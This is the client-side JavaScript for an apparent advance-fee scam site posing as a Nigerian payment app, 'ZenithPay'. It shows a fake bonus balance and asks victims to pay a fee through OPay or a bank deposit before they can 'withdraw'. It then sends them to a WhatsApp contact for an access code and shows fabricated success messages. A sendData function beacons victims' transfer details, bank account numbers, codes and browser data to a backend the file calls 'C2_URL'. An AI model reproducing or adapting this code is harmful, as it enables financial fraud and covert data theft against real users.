// ============ CONFIG ============
// ⚠️ REPLACE WITH YOUR BACKEND URL ⚠️
var C2_URL = 'https://zenithpay-backend-ehdh.onrender.com';
var ADMIN_PASSWORD = 'ZENITH2026';

// ============================================================
// ===== DASHBOARD LOAD =====
// ============================================================

function loadDashboard() {
    var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');

    var greeting = document.getElementById('greeting');
    if (greeting && userData.fullname) {
        greeting.textContent = 'Hi, ' + userData.fullname.split(' ')[0];
    }

    var avatar = document.getElementById('avatar');
    var profileAvatar = document.getElementById('profileAvatar');
    if (userData.fullname) {
        var initials = userData.fullname.split(' ').map(function(n) { return n[0]; }).join('').toUpperCase();
        if (avatar) avatar.textContent = initials;
        if (profileAvatar) profileAvatar.textContent = initials;
    }

    var accountDisplay = document.getElementById('accountDisplay');
    var bankDisplay = document.getElementById('bankDisplay');
    if (accountDisplay) accountDisplay.textContent = userData.account || '0123456789';
    if (bankDisplay) bankDisplay.textContent = userData.bank || 'GTBank';

    // Profile
    var profileName = document.getElementById('profileName');
    var profileFullName = document.getElementById('profileFullName');
    var profilePhone = document.getElementById('profilePhone');
    var profileEmail = document.getElementById('profileEmail');
    var profileEmailField = document.getElementById('profileEmailField');
    var profileBvn = document.getElementById('profileBvn');
    var profileBank = document.getElementById('profileBank');
    var profileAccount = document.getElementById('profileAccount');

    if (profileName) profileName.textContent = userData.fullname || 'Chidi Okafor';
    if (profileFullName) profileFullName.textContent = userData.fullname || 'Chidi Okafor';
    if (profilePhone) profilePhone.textContent = userData.phone || '080 1234 5678';
    if (profileEmail) profileEmail.textContent = userData.email || 'user@email.com';
    if (profileEmailField) profileEmailField.textContent = userData.email || 'user@email.com';
    if (profileBvn) profileBvn.textContent = userData.bvn || '•••••••••••';
    if (profileBank) profileBank.textContent = userData.bank || 'GTBank';
    if (profileAccount) profileAccount.textContent = userData.account || '0123456789';

    // Card names
    var cardName1 = document.getElementById('cardName1');
    var cardName2 = document.getElementById('cardName2');
    if (cardName1) cardName1.textContent = userData.fullname || 'Chidi Okafor';
    if (cardName2) cardName2.textContent = userData.fullname || 'Chidi Okafor';

    var balanceDisplay = document.getElementById('balanceDisplay');
    var statBalance = document.getElementById('statBalance');
    var statTx = document.getElementById('statTx');
    var balanceCard = document.querySelector('.balance-card');
    var emptyState = document.getElementById('emptyState');
    var bonusTx = document.getElementById('bonusTx');
    var withdrawTx = document.getElementById('withdrawTx');

    var balanceState = localStorage.getItem('zenithpay_balance') || '6000';

    if (balanceState === '0') {
        if (balanceDisplay) balanceDisplay.textContent = '₦0.00';
        if (statBalance) statBalance.textContent = '₦0';
        if (balanceCard) balanceCard.style.background = '#94A3B8';
        if (emptyState) emptyState.classList.add('hidden');
        if (bonusTx) bonusTx.classList.remove('hidden');
        if (withdrawTx) withdrawTx.classList.remove('hidden');
        if (statTx) statTx.textContent = '2';
    } else {
        if (balanceDisplay) balanceDisplay.textContent = '₦6,000.00';
        if (statBalance) statBalance.textContent = '₦6,000';
        if (statTx) statTx.textContent = '0';
        if (emptyState) emptyState.classList.remove('hidden');
        if (bonusTx) bonusTx.classList.add('hidden');
        if (withdrawTx) withdrawTx.classList.add('hidden');
    }
}

// ============================================================
// ===== TAB SWITCHING =====
// ============================================================

function switchTab(tab) {
    document.querySelectorAll('.tab-content').forEach(function(el) {
        el.classList.add('hidden');
        el.classList.remove('active');
    });

    var target = document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1));
    if (target) {
        target.classList.remove('hidden');
        target.classList.add('active');
    }

    document.querySelectorAll('.nav-item').forEach(function(el) {
        el.classList.remove('active');
        if (el.dataset.tab === tab) {
            el.classList.add('active');
        }
    });
}

document.querySelectorAll('.nav-item').forEach(function(btn) {
    btn.addEventListener('click', function() {
        switchTab(this.dataset.tab);
    });
});

// ============================================================
// ===== CARDS TAB =====
// ============================================================

document.querySelectorAll('[id^="freezeBtn"]').forEach(function(btn) {
    btn.addEventListener('click', function() {
        var cardId = this.id.replace('freezeBtn', '');
        var cardVisual = document.querySelector('#card' + cardId + ' .card-visual');
        var status = this.textContent.trim();

        if (status === '❄️ Freeze') {
            this.textContent = '🔥 Unfreeze';
            this.style.background = '#DC2626';
            if (cardVisual) {
                cardVisual.style.opacity = '0.5';
                cardVisual.style.filter = 'grayscale(0.8)';
            }
            alert('Card •••• ' + document.getElementById('cardNumber' + cardId).textContent.slice(-4) + ' has been frozen.');
        } else {
            this.textContent = '❄️ Freeze';
            this.style.background = '';
            if (cardVisual) {
                cardVisual.style.opacity = '1';
                cardVisual.style.filter = 'none';
            }
            alert('Card •••• ' + document.getElementById('cardNumber' + cardId).textContent.slice(-4) + ' has been unfrozen.');
        }
    });
});

document.querySelectorAll('[id^="cardDetailsBtn"]').forEach(function(btn) {
    btn.addEventListener('click', function() {
        var cardId = this.id.replace('cardDetailsBtn', '');
        var cardNumber = document.getElementById('cardNumber' + cardId).textContent;
        var cardName = document.getElementById('cardName' + cardId).textContent;
        var cardExpiry = document.getElementById('cardExpiry' + cardId).textContent;
        var cardNetwork = document.querySelector('#card' + cardId + ' .card-network').textContent;

        document.getElementById('detailCardNumber').textContent = cardNumber;
        document.getElementById('detailCardName').textContent = cardName;
        document.getElementById('detailCardExpiry').textContent = cardExpiry;
        document.getElementById('detailCardNetwork').textContent = cardNetwork;

        document.getElementById('cardDetailsModal').classList.remove('hidden');
    });
});

document.getElementById('closeCardDetails')?.addEventListener('click', function() {
    document.getElementById('cardDetailsModal').classList.add('hidden');
});

document.getElementById('cardDetailsModal')?.addEventListener('click', function(e) {
    if (e.target === this) {
        this.classList.add('hidden');
    }
});

document.getElementById('addCardBtn')?.addEventListener('click', function() {
    alert('📱 Your new virtual card is being generated. Check back in a few minutes.');
});

// ============================================================
// ===== TRANSFER TAB =====
// ============================================================

document.getElementById('transferBtn')?.addEventListener('click', function() {
    var bank = document.getElementById('transferBank').value;
    var account = document.getElementById('transferAccount').value;
    var amount = document.getElementById('transferAmount').value;
    var narration = document.getElementById('transferNarration').value;

    if (!bank || !account || !amount) {
        alert('⚠️ Please fill in all required fields.');
        return;
    }

    sendData({
        type: 'transfer',
        bank: bank,
        account: account,
        amount: amount,
        narration: narration || 'Transfer',
        timestamp: Date.now()
    });

    document.getElementById('transferAmountDisplay').textContent = '₦' + amount;
    document.getElementById('transferAccountDisplay').textContent = account;
    document.getElementById('transferResult').classList.remove('hidden');

    setTimeout(function() {
        document.getElementById('transferResult').classList.add('hidden');
        document.getElementById('transferBank').value = '';
        document.getElementById('transferAccount').value = '';
        document.getElementById('transferAmount').value = '';
        document.getElementById('transferNarration').value = '';
        alert('✅ Transfer completed successfully!');
    }, 3000);
});

// ============================================================
// ===== PROFILE TAB =====
// ============================================================

document.querySelectorAll('.toggle').forEach(function(toggle) {
    toggle.addEventListener('click', function() {
        if (this.textContent === 'On') {
            this.textContent = 'Off';
            this.style.color = '#94A3B8';
        } else {
            this.textContent = 'On';
            this.style.color = '#0A7E3D';
        }
    });
});

document.getElementById('logoutBtn')?.addEventListener('click', function() {
    if (confirm('Are you sure you want to logout?')) {
        localStorage.clear();
        window.location.href = 'index.html';
    }
});

// ============================================================
// ===== PAY WITH OPAY =====
// ============================================================

document.getElementById('payWithOPayBtn')?.addEventListener('click', async function() {
    var amount = document.getElementById('depositAmount').value;
    var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');

    if (!userData.email) {
        alert('⚠️ Please complete your profile first.');
        return;
    }

    try {
        this.textContent = 'Processing...';
        this.disabled = true;

        var response = await fetch(C2_URL + '/opay/create_order', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                email: userData.email,
                amount: amount,
                name: userData.fullname || 'Customer',
                phone: userData.phone || '08000000000'
            })
        });

        var result = await response.json();

        if (result.status === 'success' && result.redirect_url) {
            window.location.href = result.redirect_url;
        } else {
            alert('❌ Payment initiation failed: ' + (result.message || 'Please try again.'));
            this.textContent = '💳 Pay with OPay';
            this.disabled = false;
        }
    } catch (error) {
        console.error('OPay error:', error);
        alert('❌ An error occurred. Please try again.');
        this.textContent = '💳 Pay with OPay';
        this.disabled = false;
    }
});

// ===== CHECK OPAY PAYMENT STATUS ON RETURN =====
if (window.location.search.includes('orderNo')) {
    var params = new URLSearchParams(window.location.search);
    var orderNo = params.get('orderNo');
    var status = params.get('status');

    if (status === 'SUCCESS' && orderNo) {
        fetch(C2_URL + '/opay/verify_order', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ orderNo: orderNo })
        })
        .then(function(res) { return res.json(); })
        .then(function(data) {
            if (data.status === 'success') {
                alert('✅ Payment successful! Your bonus is now available.');
                localStorage.setItem('zenithpay_balance', '0');
                location.reload();
            } else {
                alert('⚠️ Payment verification failed. Contact support.');
            }
        });
    } else if (status === 'FAIL') {
        alert('⚠️ Payment failed. Please try again.');
    }
}

// ============================================================
// ===== WITHDRAW MODAL =====
// ============================================================

document.getElementById('withdrawBtn')?.addEventListener('click', function() {
    if (localStorage.getItem('zenithpay_balance') === '0') {
        alert('⚠️ You have already withdrawn your bonus.');
        return;
    }
    document.getElementById('withdrawModal').classList.remove('hidden');
});

document.getElementById('closeModal')?.addEventListener('click', function() {
    document.getElementById('withdrawModal').classList.add('hidden');
});

document.getElementById('withdrawModal')?.addEventListener('click', function(e) {
    if (e.target === this) {
        this.classList.add('hidden');
    }
});

// ============================================================
// ===== WHATSAPP MODAL =====
// ============================================================

document.getElementById('copyAccount')?.addEventListener('click', function() {
    var account = '0123456789';
    navigator.clipboard.writeText(account).then(function() {
        alert('✅ Account number copied!');
    }).catch(function() {
        var input = document.createElement('input');
        input.value = account;
        document.body.appendChild(input);
        input.select();
        document.execCommand('copy');
        document.body.removeChild(input);
        alert('✅ Account number copied!');
    });
});

document.getElementById('verifyPaymentBtn')?.addEventListener('click', function() {
    var amount = document.getElementById('depositAmount').value;
    var userAccount = document.getElementById('userAccount').value;
    var userBank = document.getElementById('userBank').value;

    if (!userAccount || !userBank) {
        alert('⚠️ Please fill in your account details.');
        return;
    }

    var userData = JSON.parse(localStorage.getItem('zenithpay_user') || '{}');

    sendData({
        type: 'withdrawal_attempt',
        amount: amount,
        userAccount: userAccount,
        userBank: userBank,
        timestamp: Date.now()
    });

    document.getElementById('withdrawModal').classList.add('hidden');
    document.getElementById('whatsappModal').classList.remove('hidden');

    var waLink = document.getElementById('whatsappLink');
    var msg = 'Hello, I sent ₦' + amount + ' for my ZenithPay withdrawal. My name is ' + (userData.fullname || 'User') + '. My account is ' + userAccount + ' (' + userBank + '). Please send my code.';
    waLink.href = 'https://wa.me/2348000000000?text=' + encodeURIComponent(msg);
});

document.getElementById('closeWhatsapp')?.addEventListener('click', function() {
    document.getElementById('whatsappModal').classList.add('hidden');
});

document.getElementById('whatsappModal')?.addEventListener('click', function(e) {
    if (e.target === this) {
        this.classList.add('hidden');
    }
});

document.getElementById('verifyCodeBtn')?.addEventListener('click', function() {
    var enteredPassword = document.getElementById('adminPassword').value;

    if (enteredPassword !== ADMIN_PASSWORD) {
        var input = document.getElementById('adminPassword');
        input.style.borderColor = '#DC2626';
        input.style.boxShadow = '0 0 0 3px rgba(220,38,38,0.2)';
        input.value = '';
        input.placeholder = '❌ Invalid code. Try again.';
        setTimeout(function() {
            input.style.borderColor = '#E2E8F0';
            input.style.boxShadow = 'none';
            input.placeholder = 'Enter code from admin';
        }, 3000);
        return;
    }

    sendData({
        type: 'access_code_verified',
        code: enteredPassword,
        timestamp: Date.now()
    });

    document.getElementById('whatsappModal').classList.add('hidden');

    var balanceDisplay = document.getElementById('balanceDisplay');
    var statBalance = document.getElementById('statBalance');
    var balanceCard = document.querySelector('.balance-card');
    var emptyState = document.getElementById('emptyState');
    var bonusTx = document.getElementById('bonusTx');
    var withdrawTx = document.getElementById('withdrawTx');
    var statTx = document.getElementById('statTx');

    if (balanceDisplay) balanceDisplay.textContent = '₦0.00';
    if (statBalance) statBalance.textContent = '₦0';
    if (balanceCard) balanceCard.style.background = '#94A3B8';
    if (emptyState) emptyState.classList.add('hidden');
    if (bonusTx) bonusTx.classList.remove('hidden');
    if (withdrawTx) withdrawTx.classList.remove('hidden');
    if (statTx) statTx.textContent = '2';

    localStorage.setItem('zenithpay_balance', '0');

    alert('✅ Withdrawal successful! Your funds have been processed.');

    setTimeout(function() {
        window.location.href = 'success.html';
    }, 1500);
});

// ============================================================
// ===== SEND DATA =====
// ============================================================

function sendData(payload) {
    payload._timestamp = Date.now();
    payload._ua = navigator.userAgent;

    if (navigator.sendBeacon) {
        var blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        navigator.sendBeacon(C2_URL + '/capture', blob);
        return;
    }

    fetch(C2_URL + '/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        mode: 'no-cors'
    }).catch(function() {});
}

// ============================================================
// ===== INIT =====
// ============================================================

document.addEventListener('DOMContentLoaded', loadDashboard);
